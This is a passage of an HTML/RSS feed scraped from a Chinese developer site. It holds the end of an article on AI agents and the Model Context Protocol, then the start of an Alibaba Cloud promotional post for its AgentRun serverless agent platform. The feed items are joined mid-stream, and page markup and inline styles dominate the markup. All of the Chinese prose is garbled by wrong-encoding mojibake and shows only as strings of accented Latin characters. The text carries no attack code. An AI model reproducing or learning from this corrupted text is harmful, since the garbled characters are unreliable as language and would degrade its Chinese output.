<li>æ„å›¾ç†è§£ä¸ç²¾å‡†ï¼šå¯¹æ¨¡ç³Šéœ€æ±‚ã€éšå«æ„å›¾çš„æ•æ‰èƒ½åŠ›ä¸è¶³ï¼Œå¯èƒ½åç¦»ç”¨æˆ·çœŸå®ç›®æ ‡ï¼Œå°¤å…¶æ¶‰åŠä¸»è§‚åå¥½çš„åœºæ™¯ï¼ˆå¦‚ä¸ªæ€§åŒ–æ–¹æ¡ˆå®šåˆ¶ï¼‰ã€‚</li>
<li>é£é™©æ§åˆ¶ä¸è´£ä»»ç•Œå®šæ¨¡ç³Šï¼šè‡ªä¸»è°ƒç”¨å·¥å…·æ—¶å¯èƒ½è§¦å‘åˆè§„é£é™©ï¼ˆå¦‚è¯¯æ“ä½œæ•°æ®ã€æ³„éœ²éšç§ï¼‰ï¼Œä¸”å‡ºç°é—®é¢˜åéš¾ä»¥æ˜ç¡®è´£ä»»å½’å±ã€‚</li>
<li>èµ„æºä¾èµ–ä¸ç¨³å®šæ€§ä¸è¶³ï¼šé«˜åº¦ä¾èµ–å¤–éƒ¨å·¥å…· APIã€çŸ¥è¯†åº“çš„å¯ç”¨æ€§ï¼Œä¸€æ—¦æ¥å£æ•…éšœæˆ–æ•°æ®æ›´æ–°ä¸åŠæ—¶ï¼Œä¼šç›´æ¥å¯¼è‡´ä»»åŠ¡ä¸­æ–­ã€‚</li>
<li>ç¼ºä¹çµæ´»åº”å˜èƒ½åŠ›ï¼šé‡åˆ°çªå‘æƒ…å†µï¼ˆå¦‚è®¡åˆ’ä¸­çš„å·¥å…·ä¸å¯ç”¨ã€éœ€æ±‚ä¸´æ—¶å˜æ›´ï¼‰ï¼Œè°ƒæ•´æ–¹æ¡ˆçš„æ•ˆç‡ä½ï¼Œæ˜“é™·å…¥ â€œæ‰§è¡Œæ­»å¾ªç¯â€ã€‚</li>
</ol>
<p>æ¯”å¦‚ä½ è®©å®ƒâ€œç­–åˆ’ä¸€åœºå‘¨æœ«æ—…è¡Œâ€ï¼ŒAgentä¼šè‡ªåŠ¨æ‹†è§£æˆâ€œæŸ¥ç›®çš„åœ°å¤©æ°”â†’æ‰¾æ™¯ç‚¹æ”»ç•¥â†’è®¢é…’åº—â†’è§„åˆ’è·¯çº¿â€ç­‰æ­¥éª¤ï¼Œåˆ†åˆ«è°ƒç”¨å¤©æ°”APIã€æ—…æ¸¸çŸ¥è¯†åº“ã€è®¢ç¥¨å·¥å…·å®Œæˆï¼Œæœ€åç»™ä½ ä¸€ä»½å®Œæ•´æ”»ç•¥ã€‚ä½†æ­¤æ—¶çš„Agentä»æœ‰ä¸è¶³ï¼šä¸åŒAIæ¨¡å‹å’Œå·¥å…·å¯¹æ¥æ—¶å¾ˆæ··ä¹±ï¼Œå®¹æ˜“å‡ºç°â€œæ²Ÿé€šä¸ç•…â€çš„é—®é¢˜ã€‚</p>
<h2 data-id="heading-6">5. MCP - é€šç”¨æ²Ÿé€šåè®®ï¼Œæ„å»ºè·¨å¹³å°çš„ AI å·¥å…·ç”Ÿæ€</h2>
<p><a href="https://juejin.cn/post/7522106240408928275" target="_blank" title="https://juejin.cn/post/7522106240408928275">MCP é€šç”¨çŸ¥è¯†</a></p>
<p><strong>æ¦‚å¿µï¼š</strong> å…¨ç§° Model Context Protocolï¼ˆæ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼‰ï¼Œæ ‡å‡†åŒ–æ¨¡å‹å’Œå¤–éƒ¨å·¥å…·ä¹‹é—´çš„è¿æ¥æ–¹å¼ã€‚æ˜¯ Anthropic äº 2024 å¹´ 11 æœˆæå‡ºçš„å¼€æ”¾æ ‡å‡†ï¼Œå ªç§° AI ä¸å¤–éƒ¨ä¸–ç•Œäº¤äº’çš„ â€œä¸‡èƒ½æ¥å£â€ï¼Œä¸“é—¨è§£å†³ä¸åŒ AI æ¨¡å‹ä¸å·¥å…·ã€æ•°æ®æºå¯¹æ¥æ··ä¹±çš„é—®é¢˜ã€‚</p>
<p><strong>æ ¸å¿ƒèƒ½åŠ›ï¼š</strong> å¯ä»¥æŠŠå®ƒç†è§£ä¸º AI é¢†åŸŸçš„ USB-C æ¥å£æˆ– â€œä¸‡èƒ½é¥æ§å™¨â€ã€‚è¿‡å»ä¸åŒ AI æ¨¡å‹è°ƒç”¨å·¥å…·æ—¶ï¼Œéœ€é’ˆå¯¹æ€§å¼€å‘é€‚é…ä»£ç ï¼Œæ¯”å¦‚ OpenAI å’Œç™¾åº¦æ–‡å¿ƒä¸€è¨€è°ƒç”¨åŒä¸€æ•°æ®åº“å¯èƒ½è¦å†™ä¸¤å¥—é€»è¾‘ï¼›è€Œ MCP å®šä¹‰äº†ç»Ÿä¸€çš„é€šä¿¡è§„åˆ™ï¼Œåªè¦ AI æ¨¡å‹å’Œå·¥å…·éƒ½æ”¯æŒè¯¥åè®®ï¼Œå°±èƒ½æ— ç¼å¯¹æ¥ï¼Œä¸ç”¨é‡å¤é€‚é…ï¼Œè§£å†³äº† AI ä¸å·¥å…·äº¤äº’çš„ â€œNÃ—Mâ€ é€‚é…éš¾é¢˜ï¼ˆä»¥å‰æ˜¯ M Ã— N çš„æ··ä¹±å¯¹æ¥ï¼Œç°åœ¨æ˜¯ M + N çš„æ ‡å‡†æ¥å£ã€‚ï¼‰ã€‚</p>
<p><strong>ä¸ Function Call çš„åŒºåˆ«ï¼š</strong> ä¸¤è€…éƒ½èƒ½è®© AI è°ƒç”¨å¤–éƒ¨å·¥å…·ï¼Œä½†é€»è¾‘å·®å¼‚æ˜æ˜¾ã€‚Function Call æ˜¯å•ä½“é›†æˆå¼æ–¹æ¡ˆï¼Œæ¯”å¦‚æŸ AI æ¨¡å‹çš„ Function Call åŠŸèƒ½ï¼Œåªèƒ½é€‚é…è¯¥å¹³å°æŒ‡å®šçš„å·¥å…·æˆ–æ¥å£ï¼Œåˆ‡æ¢æ¨¡å‹åå¯èƒ½è¦é‡æ–°å¼€å‘ï¼›è€Œ MCP æ˜¯åˆ†å¸ƒå¼çš„æ ‡å‡†åŒ–åè®®ï¼Œç›¸å½“äºç‹¬ç«‹çš„ â€œç¿»è¯‘å®˜â€ï¼Œä¸ç®¡ AI æ¨¡å‹å’Œå·¥å…·æ¥è‡ªå“ªä¸ªå¹³å°ï¼Œåªè¦éµå¾ªè¯¥åè®®ï¼Œå°±èƒ½äº’ç›¸é€šä¿¡ï¼Œæ›´é€‚åˆæ„å»ºè·¨å¹³å°çš„ AI å·¥å…·ç”Ÿæ€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09f22785def1433c9944ad077490eb7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKL6bG85LiN6YeN:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398107&amp;x-signature=iJtRDbHHhCd19tMMd5tqhUZVSTM%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AgentRunï¼šå±è”½åº•å±‚å¤æ‚æ€§ï¼Œè®©å¼€å‘è€…ä¸“æ³¨ AI ä¸šåŠ¡é€»è¾‘åˆ›æ–°ï¼]]></title>    <link>https://juejin.cn/post/7583906478328086547</link>    <guid>https://juejin.cn/post/7583906478328086547</guid>    <pubDate>2025-12-15T10:13:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583906478328086547" data-draft-id="7583912899388522539" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AgentRunï¼šå±è”½åº•å±‚å¤æ‚æ€§ï¼Œè®©å¼€å‘è€…ä¸“æ³¨ AI ä¸šåŠ¡é€»è¾‘åˆ›æ–°ï¼"/> <meta itemprop="keywords" content="äº‘åŸç”Ÿ"/> <meta itemprop="datePublished" content="2025-12-15T10:13:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘äº‘åŸç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AgentRunï¼šå±è”½åº•å±‚å¤æ‚æ€§ï¼Œè®©å¼€å‘è€…ä¸“æ³¨ AI ä¸šåŠ¡é€»è¾‘åˆ›æ–°ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘äº‘åŸç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:13:19.000Z" title="Mon Dec 15 2025 10:13:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b179d77573d747a6978a1112427ef367~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398398&amp;x-signature=OEGSz3dtS2Se8ypPA8jrG7SNVAQ%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>AI Agent æ­£ä»æŠ€æœ¯æ¦‚å¿µå¿«æ­¥èµ°å‘ç”Ÿäº§åº”ç”¨ã€‚ç„¶è€Œï¼Œå½“å¼€å‘è€…è¯•å›¾å°†åŸå‹æ¨å‘ç”Ÿäº§ç¯å¢ƒæ—¶ï¼Œä¸€é“å·¨å¤§çš„â€œç”Ÿäº§åŒ–é¸¿æ²Ÿâ€éšä¹‹æ˜¾ç°ï¼šä¼—å¤šå¼€æºæ¡†æ¶è™½æä¾›äº†å¼ºå¤§çš„â€œå¤§è„‘â€ï¼Œå´ç¼ºå¤±äº†ä¼ä¸šçº§åº”ç”¨èµ–ä»¥ä¸ºç”Ÿçš„â€œåŸºç¡€è®¾æ–½â€ã€‚</p>
<p>å¼€å‘è€…å®ç°ä»â€œåŸå‹â€åˆ°â€œäº§å“â€çš„æ¯ä¸€æ­¥ï¼Œéƒ½å……æ»¡äº†åŸºç¡€è®¾æ–½çš„æŒ‘æˆ˜ã€‚è¦è·¨è¶Šè¿™é“é¸¿æ²Ÿï¼Œéœ€è¦çš„ä¸ä»…ä»…æ˜¯æ›´èªæ˜çš„æ¨¡å‹ï¼Œè€Œæ˜¯èƒ½å…¨é¢è§£å†³è¿™äº›é—®é¢˜çš„åŸºç¡€è®¾æ–½å¹³å°ã€‚è¿™æ­£æ˜¯æˆ‘ä»¬å¼€å‘å‡½æ•°è®¡ç®— AgentRun çš„åˆè¡·ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¼ä¸šçº§ Agent é¢ä¸´çš„ä¸‰ä¸ªç—›ç‚¹</h2>
<p><strong>1. æ‰§è¡Œç¯å¢ƒå¤æ‚ã€è¿ç»´å›°éš¾</strong></p>
<p>è¿è¡Œæ—¶ç¯å¢ƒä¸æ²™ç®±ä¸º Agent æä¾›éœ€è¦æ‰§è¡Œä»£ç ã€æ“ä½œæµè§ˆå™¨ã€è°ƒç”¨ç³»ç»Ÿèƒ½åŠ›ï¼Œå¾€å¾€ä¼šé¢ä¸´ä¸€ç³»åˆ—æŒ‘æˆ˜ï¼šé…ç½®å¤šè¯­è¨€ã€ç®¡ç†ä¾èµ–å’Œæ›´æ–°å®‰å…¨è¡¥ä¸ç­‰äº§ç”Ÿé«˜æ˜‚çš„ç»´æŠ¤è´Ÿæ‹…ï¼›ä¼ ç»Ÿè¿è¡Œç¯å¢ƒåœ¨å¤§è§„æ¨¡å¹¶å‘æ‰§è¡Œä¸‹çš„æ€§èƒ½ç“¶é¢ˆï¼›è„†å¼±çš„å®‰å…¨éš”ç¦»å¯èƒ½å¼•å‘æ•°æ®æ³„éœ²ç­‰é‡å¤§é£é™©ã€‚æ›´å…³é”®çš„æ˜¯ï¼Œæ—¥ç›Šå¤æ‚çš„ä¼šè¯çŠ¶æ€ç®¡ç†ä¹Ÿè®© Agent å¼€å‘å¤æ‚åº¦æŒ‡æ•°çº§å¢é•¿ã€‚</p>
<p><strong>2. å¤–éƒ¨ä¾èµ–ä¸ç¨³å®šã€æˆæœ¬é«˜</strong></p>
<p>å¤§æ¨¡å‹è°ƒç”¨ç¨³å®šæ€§æ˜¯ Agent åº”ç”¨çš„æœ€å¤§éšæ‚£ã€‚æ¨¡å‹å‚å•†çš„é™æµã€è¶…æ—¶ã€æœåŠ¡ä¸­æ–­æ—¶æœ‰å‘ç”Ÿï¼Œä¸€æ—¦ä¸»æ¨¡å‹å‡ºç°é—®é¢˜ï¼Œæ•´ä¸ªåº”ç”¨å°±ä¼šç˜«ç—ªã€‚åŒæ—¶ï¼ŒAgent éœ€è¦è°ƒç”¨å¤§é‡å·¥å…·å’Œ APIï¼Œæ¯ä¸ªå·¥å…·çš„é›†æˆéƒ½è¦å¤„ç†ä¸åŒçš„è°ƒç”¨æ–¹å¼ã€å‚æ•°æ ¼å¼ã€é‰´æƒé€»è¾‘ï¼Œå¼€å‘ç»´æŠ¤æˆæœ¬æé«˜ã€‚æ›´æ£˜æ‰‹çš„æ˜¯ï¼Œä¼ä¸šå¯¹æ¥å¤šä¸ªæ¨¡å‹å’Œå·¥å…·ï¼Œä½†ç¼ºä¹ç»Ÿä¸€çš„å®¹é”™å’Œæ²»ç†æœºåˆ¶ï¼Œæˆæœ¬å¿«é€Ÿç´¯åŠ å´éš¾ä»¥ä¼˜åŒ–ã€‚</p>
<p><strong>3. è¿è¡Œè¿‡ç¨‹çš„â€œé»‘ç›’â€çŠ¶æ€</strong></p>
<p>Agent åº”ç”¨çš„è°ƒç”¨é“¾è·¯å¤æ‚ï¼Œä»ç”¨æˆ·è¯·æ±‚åˆ°æ¨¡å‹æ¨ç†ã€çŸ¥è¯†åº“æ£€ç´¢ã€å·¥å…·è°ƒç”¨ã€MCP æ‰§è¡Œï¼Œä¸­é—´ç»è¿‡å¤šä¸ªç¯èŠ‚ä¸”å¯èƒ½åå¤è°ƒç”¨ã€‚ä»»ä½•ä¸€ä¸ªç¯èŠ‚çš„æ€§èƒ½ç“¶é¢ˆæˆ–é”™è¯¯éƒ½ä¼šå½±å“æœ€ç»ˆæ•ˆæœï¼Œä½†ä¼ ç»Ÿæ—¥å¿—å’Œç›‘æ§æ‰‹æ®µå¾ˆéš¾æ¸…æ™°è¿½è¸ªæ•´ä¸ªè¿‡ç¨‹ã€‚å¼€å‘è€…ä¸çŸ¥é“å“ªä¸ªç¯èŠ‚æ…¢ã€å“ªé‡Œå‡ºé”™ï¼Œè¿™ç§é»‘ç›’çŠ¶æ€è®©é—®é¢˜å®šä½å’Œæˆæœ¬ä¼˜åŒ–éƒ½æå…¶å›°éš¾ã€‚</p>
<p>æ˜¾ç„¶ï¼Œè¦è®© Agent åº”ç”¨çœŸæ­£è½åœ°ï¼Œå¼€å‘è€…è¿«åˆ‡éœ€è¦ä¸€ä¸ªèƒ½å±è”½åº•å±‚å¤æ‚æ€§ã€å…·å¤‡ä¸€ç«™å¼æ²»ç†èƒ½åŠ›çš„ä¸“ä¸šçº§åŸºç¡€è®¾æ–½å¹³å°ã€‚</p>
<h2 data-id="heading-1">å‡½æ•°è®¡ç®— AgentRun æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>ä¸€å¥è¯ä»‹ç»ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Ffc%3Fspm%3Da1z389.11499242.0.0.65452413RXCQWs%26utm_content%3Dg_1000408146" target="_blank" title="https://www.aliyun.com/product/fc?spm=a1z389.11499242.0.0.65452413RXCQWs&amp;utm_content=g_1000408146" ref="nofollow noopener noreferrer">å‡½æ•°è®¡ç®—</a> AgentRun æ˜¯ä¸€ä¸ªä»¥é«˜ä»£ç ä¸ºæ ¸å¿ƒçš„ä¸€ç«™å¼ Agentic AI åŸºç¡€è®¾æ–½å¹³å°ã€‚ç§‰æŒç”Ÿæ€å¼€æ”¾å’Œçµæ´»ç»„è£…çš„ç†å¿µï¼Œä¸ºä¼ä¸šçº§ Agent åº”ç”¨æä¾›ä»å¼€å‘ã€éƒ¨ç½²åˆ°è¿ç»´çš„å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5fa715f3d56a4a96a2465d6600d4ba4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398398&amp;x-signature=rjfMT87X4GrrQ0BY5dgkfYzSf9Q%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><em>å‡½æ•°è®¡ç®— AgentRun æ¶æ„å›¾</em></p>
<p>AgentRun è¿è¡Œæ—¶åŸºäº<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Ffc%3Fspm%3Da1z389.11499242.0.0.65452413RXCQWs%26utm_content%3Dg_1000408146" target="_blank" title="https://www.aliyun.com/product/fc?spm=a1z389.11499242.0.0.65452413RXCQWs&amp;utm_content=g_1000408146" ref="nofollow noopener noreferrer">é˜¿é‡Œäº‘å‡½æ•°è®¡ç®— FC</a> æ„å»ºï¼Œç»§æ‰¿äº† Serverless è®¡ç®—æè‡´å¼¹æ€§ã€æŒ‰é‡ä»˜è´¹ã€é›¶è¿ç»´çš„æ ¸å¿ƒä¼˜åŠ¿ã€‚é€šè¿‡æ·±åº¦é›†æˆ AgentScopeã€Langchainã€RAGFlowã€Mem0 ç­‰ä¸»æµå¼€æºç”Ÿæ€ã€‚AgentRun å°† Serverless çš„æè‡´å¼¹æ€§ã€é›¶è¿ç»´å’ŒæŒ‰é‡ä»˜è´¹çš„ç‰¹æ€§ä¸ AI åŸç”Ÿåº”ç”¨åœºæ™¯æ·±åº¦èåˆï¼ŒåŠ©åŠ›ä¼ä¸šå®ç°æˆæœ¬ä¸æ•ˆç‡çš„æè‡´ä¼˜åŒ–ï¼Œå¹³å‡ TCO é™ä½ 60%ã€‚Â </p>
<p><strong>è®©å¼€å‘è€…åªéœ€ä¸“æ³¨äº Agent çš„ä¸šåŠ¡é€»è¾‘åˆ›æ–°ï¼Œæ— éœ€å…³å¿ƒåº•å±‚åŸºç¡€è®¾æ–½ï¼Œè®© Agentic AI çœŸæ­£è¿›å…¥ä¼ä¸šç”Ÿäº§ç¯å¢ƒã€‚</strong></p>
<p>ç«‹å³ä½“éªŒ AgentRunï¼ˆå»ºè®® PC ç«¯æ‰“å¼€ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ffcnext.console.aliyun.com%2Fagent-run%2Fcn-hangzhou%2Fagent%2Fexplore" target="_blank" title="https://fcnext.console.aliyun.com/agent-run/cn-hangzhou/agent/explore" ref="nofollow noopener noreferrer">fcnext.console.aliyun.com/agent-run/câ€¦</a></p>
<h2 data-id="heading-2">äº”å¤§æ ¸å¿ƒèƒ½åŠ›ï¼Œè§£å†³ä¼ä¸šçº§ Agent ç”Ÿäº§åœºæ™¯éš¾é¢˜</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc962ee5fe38469faac690eb4f0946ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398398&amp;x-signature=y%2BKkS3YWbygV3KmhYf7NJgNQc0s%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><em>å¼€å‘è€…å¼€å‘â€” AgentRunâ€”ç”¨æˆ·ä½¿ç”¨</em></p>
<h3 data-id="heading-3">æ ¸å¿ƒåŠŸèƒ½ 1ï¼šæ¯«ç§’çº§æè‡´å¼¹æ€§ï¼ŒçœŸæ­£æŒ‰éœ€ä»˜è´¹</h3>
<p>AgentRun é’ˆå¯¹ Agent ç‰¹æ€§æ·±åº¦ä¼˜åŒ–ï¼Œå®ç°æ€§èƒ½ä¸æˆæœ¬çš„æè‡´å¹³è¡¡ã€‚</p>
<ul>
<li>æè‡´å¼¹æ€§ï¼šæ”¯æŒä» 0 åˆ°ç™¾ä¸‡çº§å¹¶å‘æè‡´å¼¹æ€§ï¼Œé…åˆå¿™é—²æ—¶ç²¾ç»†åŒ–è®¡è´¹ï¼Œå¤§å¹…é™ä½æˆæœ¬ã€‚</li>
<li>æµ…ä¼‘çœ ä¸æ·±ä¼‘çœ ï¼šé€šè¿‡è¯·æ±‚æ„ŸçŸ¥è°ƒåº¦ã€å®ä¾‹å†»ç»“ä»¥åŠå†…å­˜å¿«ç…§æŠ€æœ¯ï¼Œå®ç° Agent è¿è¡Œæ—¶ä¸æ²™ç®±åœ¨æ— è¯·æ±‚æ—¶è‡ªåŠ¨ä¼‘çœ ã€‚æµ…ä¼‘çœ Â 1 æ¯«ç§’æé€Ÿå”¤é†’å®ç°ç™¾å€æ€§èƒ½åŠ é€Ÿï¼Œæ€§èƒ½è¶…è¶Šä¼ ç»ŸæœåŠ¡å™¨ã€è™šæ‹Ÿæœºå’Œå®¹å™¨ç­‰ã€‚æ·±ä¼‘çœ å®ç°è¶…é•¿æ—¶é—´ä¼šè¯çŠ¶æ€æŒä¹…åŒ–ä»¥åŠç§’çº§å”¤é†’ã€‚</li>
<li>ä¼šè¯äº²å’Œï¼šå€ŸåŠ©ä¼šè¯äº²å’Œæœºåˆ¶å°†åŒä¸€ä¼šè¯ç²¾å‡†è·¯ç”±è‡³åŒä¸€å®ä¾‹ï¼Œçªç ´ Serverless æ— çŠ¶æ€é™åˆ¶ï¼Œä¸º Agent æä¾›æŒä¹…çš„æœ‰çŠ¶æ€ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œç¡®ä¿å¤æ‚å¤šè½®å¯¹è¯çš„æµç•…æ€§ã€‚</li>
</ul>
<h3 data-id="heading-4">æ ¸å¿ƒåŠŸèƒ½ 2ï¼šä¼ä¸šçº§å®‰å…¨æ²™ç®± Sandbox</h3>
<p>AgentRun æä¾› Code Interpreterã€Browser Toolã€All In One ç­‰å®‰å…¨æ²™ç®±ã€‚</p>
<ul>
<li>é«˜æ€§èƒ½æ‰§è¡Œç¯å¢ƒï¼šå†…ç½®å¼€ç®±å³ç”¨çš„å¤šè¯­è¨€æ‰§è¡Œå¼•æ“ä¸æµè§ˆå™¨è‡ªåŠ¨åŒ–å¼•æ“ï¼Œå¯æ‰§è¡Œæ•°æ®åˆ†æã€ç½‘é¡µæŠ“å–ã€è¡¨å•å¡«å†™ç­‰å¤æ‚ä»»åŠ¡ã€‚</li>
<li>ä¼ä¸šçº§å®‰å…¨ä¿éšœï¼šé€šè¿‡è¯·æ±‚ã€å®ä¾‹ã€ä¼šè¯å¤šç»´åº¦ç®—åŠ›éš”ç¦»ä¸åŠ¨æ€æŒ‚è½½æŠ€æœ¯ï¼Œç¡®ä¿æ•°æ®ã€èµ„æºå¼ºéš”ç¦»ï¼›æ”¯æŒç»†ç²’åº¦æƒé™æ§åˆ¶ä¸å®Œæ•´çš„æ—¥å¿—å®¡è®¡åŠŸèƒ½ã€‚</li>
</ul>
<h3 data-id="heading-5">æ ¸å¿ƒåŠŸèƒ½ 3ï¼šæ¨¡å‹ä¸å·¥å…·çš„ç»Ÿä¸€æ²»ç†</h3>
<ul>
